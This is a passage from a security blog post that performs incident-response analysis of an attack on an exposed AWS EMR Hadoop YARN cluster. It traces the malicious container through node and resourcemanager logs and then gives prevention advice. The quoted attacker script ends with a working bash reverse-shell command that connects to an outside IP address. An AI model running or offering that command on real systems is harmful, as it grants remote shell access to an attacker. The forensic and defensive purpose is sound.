</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Launching container&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>exec</span> /bin/bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/3.94.211.164/6767 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>At this point we know what was ran, but we don&rsquo;t know which node the malicious code was executed. This is going to be critical to discover so that we can conduct further analysis of the system to see what else the attacker did. To do this we need to change to a new directory within S3 to find the node logs. Node logs can be found here: <code>node/NODE INSTANCE ID/applications/hadoop-yarn</code></p><p>These logs are local logs for each instance in the cluster and show all of the application submissions. A sample output is below.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=hl><span class=lnt> 9
</span></span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=hl><span class=lnt>27
</span></span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>2020-06-20 20:09:04,277 INFO SecurityLogger.org.apache.hadoop.ipc.Server <span class=o>(</span>Socket Reader <span class=c1>#1 for port 8041): Auth successful for appattempt_1590702911576_0016_000001 (auth:SIMPLE)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl <span class=o>(</span>IPC Server handler <span class=m>32</span> on default port 8041<span class=o>)</span>: Start request <span class=k>for</span> container_1590702911576_0016_01_000001 by user dr.who
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl <span class=o>(</span>IPC Server handler <span class=m>32</span> on default port 8041<span class=o>)</span>: Creating a new application reference <span class=k>for</span> app application_1590702911576_0016
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Application application_1590702911576_0016 transitioned from NEW to INITING
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.NMAuditLogger <span class=o>(</span>IPC Server handler <span class=m>32</span> on default port 8041<span class=o>)</span>: <span class=nv>USER</span><span class=o>=</span>dr.who <span class=nv>IP</span><span class=o>=</span>172.31.18.33 <span class=nv>OPERATION</span><span class=o>=</span>Start Container Request <span class=nv>TARGET</span><span class=o>=</span>ContainerManageImpl <span class=nv>RESULT</span><span class=o>=</span>SUCCESS <span class=nv>APPID</span><span class=o>=</span>application_1590702911576_0016 <span class=nv>CONTAINERID</span><span class=o>=</span>container_1590702911576_0016_01_000001
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Adding container_1590702911576_0016_01_000001 to application application_1590702911576_0016
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Application application_1590702911576_0016 transitioned from INITING to RUNNING
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Container container_1590702911576_0016_01_000001 transitioned from NEW to SCHEDULED
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.AuxServices <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Got event CONTAINER_INIT <span class=k>for</span> appId application_1590702911576_0016
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,292 INFO org.apache.spark.network.yarn.YarnShuffleService <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Initializing container container_1590702911576_0016_01_000001
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.scheduler.ContainerScheduler <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Starting container <span class=o>[</span>container_1590702911576_0016_01_000001<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Container container_1590702911576_0016_01_000001 transitioned from SCHEDULED to RUNNING
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span class=o>(</span>NM ContainerManager dispatcher<span class=o>)</span>: Starting resource-monitoring <span class=k>for</span> container_1590702911576_0016_01_000001
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>2020-06-20 20:09:05,867 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span class=o>(</span>Container Monitor<span class=o>)</span>: container_1590702911576_0016_01_000001<span class=err>&#39;</span>s <span class=nv>ip</span> <span class=o>=</span> 172.31.22.26, and <span class=nv>hostname</span> <span class=o>=</span> ip-172-31-22-26.ec2.internal
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:05,873 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span class=o>(</span>Container Monitor<span class=o>)</span>: Skipping monitoring container container_1590702911576_0016_01_000001 since CPU usage is not yet available.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2020-06-20 20:09:35,593 ERROR org.apache.hadoop.yarn.server.nodemanager.NodeStatusUpdaterImpl <span class=o>(</span>Node Status Updater<span class=o>)</span>: NM node labels <span class=o>{}</span> were not accepted by RM and message from RM : null</span></span></code></pre></td></tr></table></div></div><p>On line 9 in the logs above we can see that the anonymous user &lsquo;dr.who&rsquo; requested to start a container, the application ID, and the container ID for the particular request. On line 27 we can see the node within our cluster which ran the malicious application.</p><p>Additional logs can be found on the nodes themselves. Another way we can see activity is by pulling the hadoop-yarn-resourcemanager logs out of the primary server.</p><p>Within this log source we can see lines similar to the one below that show the resourcemanager assigning our malicious container <code>container_1590702911576_0016_01_000001</code> work to the <code>172.31.22.26</code> host. This is a great way to determine which host(s) the malicious activity occured on.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>2020-06-20 20:09:04,269 INFO org.apache.hadoop.yarn.server.resourcemanager.scheduler.common.fica.FiCaSchedulerNode <span class=o>(</span>SchedulerEventDispatcher:Event Processor<span class=o>)</span>: Assigned container container_1590702911576_0016_01_000001 of capacity memory:32, vCores:1 on host ip-172-31-22-26.ec2.internal:8041, which has <span class=m>1</span> containers, memory:32, vCores:1 used and memory:12256, vCores:3 available after allocation
</span></span></code></pre></div><p>Other helpful information can be pulled from this log source. The following log entry shows the initial application creation request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>2020-06-20 20:09:04,216 INFO org.apache.hadoop.yarn.server.resourcemanager.RMAuditLogger <span class=o>(</span>qtp677217562-27<span class=o>)</span>: <span class=nv>USER</span><span class=o>=</span>dr.who <span class=nv>OPERATION</span><span class=o>=</span>Submit Application Request <span class=nv>TARGET</span><span class=o>=</span>ClientRMService <span class=nv>RESULT</span><span class=o>=</span>SUCCESS <span class=nv>APPID</span><span class=o>=</span>application_1590702911576_0016 <span class=nv>QUEUENAME</span><span class=o>=</span>default
</span></span></code></pre></div><p>Combining several other log entries from this file will show the entire lifecyle of the application. This is very helpful when attempting to pull together a detailed timeline of all the events.</p><hr><h3 id=next-steps>Next Steps<a hidden class=anchor aria-hidden=true href=#next-steps>#</a></h3><p>Now that we have a general understanding of what occured, and where it occured we have to begin digging into the activity that occured on the node which spawned the reverse shell. If there are hundreds of application run requests they will all have to be examined. Without an understanding of each request it&rsquo;s hard to say exactly what occured or which nodes were potentially compromised.</p><hr><h3 id=prevention>Prevention<a hidden class=anchor aria-hidden=true href=#prevention>#</a></h3><p>Preventing this behavior is straight forward, do not expose EMR clusters to the Internet. Thats it. Make sure the security groups associated with each node in the cluster are scoped to the minium access required to manage and maintain the systems. There is even a GuardDuty alert <a href=https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_recon.html#PortProbeEMRUnprotectedPort>Port Probe EMR Unprotected Port</a>. That will fire if someone scans a sensitive port (8088).</p><hr><h3 id=additional-resources>Additional Resources<a hidden class=anchor aria-hidden=true href=#additional-resources>#</a></h3><p>Additional references, I leaned on these heavily while trying to better understand this space:</p><ul><li><a href=https://blog.radware.com/security/2018/11/hadoop-yarn-an-assessment-of-the-attack-surface-and-its-exploits/>Hadoop YARN: An Assessment of the Attack Surface and Its Exploits</a></li><li><a href=https://medium.com/@ivan.vasquez/dont-let-dr-who-hijack-your-emr-cluster-9bb67daa4641>Don&rsquo;t let Dr.Who hijack your EMR cluster</a></li><li><a href=https://medium.com/@neerajsabharwal/hadoop-yarn-hack-9a72cc1328b6>Hadoop Yarn hack?</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://jellyparks.com/tags/aws/>aws</a></li><li><a href=https://jellyparks.com/tags/cloud/>cloud</a></li><li><a href=https://jellyparks.com/tags/dfir/>dfir</a></li></ul><nav class=paginav><a class=prev href=https://jellyparks.com/posts/ec2-ssrf/><span class=title>« Prev Page</span><br><span>ec2_ssrf</span></a>
<a class=next href=https://jellyparks.com/posts/iam-privesc-by-attachment/><span class=title>Next Page »</span><br><span>iam_privesc_by_attachment</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share emr_security_woes on twitter" href="https://twitter.com/intent/tweet/?text=emr_security_woes&url=https%3a%2f%2fjellyparks.com%2fposts%2femr-security-woes%2f&hashtags=aws%2ccloud%2cdfir"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share emr_security_woes on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fjellyparks.com%2fposts%2femr-security-woes%2f&title=emr_security_woes&summary=emr_security_woes&source=https%3a%2f%2fjellyparks.com%2fposts%2femr-security-woes%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share emr_security_woes on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fjellyparks.com%2fposts%2femr-security-woes%2f&title=emr_security_woes"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share emr_security_woes on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fjellyparks.com%2fposts%2femr-security-woes%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share emr_security_woes on whatsapp" href="https://api.whatsapp.com/send?text=emr_security_woes%20-%20https%3a%2f%2fjellyparks.com%2fposts%2femr-security-woes%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share emr_security_woes on telegram" href="https://telegram.me/share/url?text=emr_security_woes&url=https%3a%2f%2fjellyparks.com%2fposts%2femr-security-woes%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://jellyparks.com>JellyParks</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerText="copy";function s(){t.innerText="copied!",setTimeout(()=>{t.innerText="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>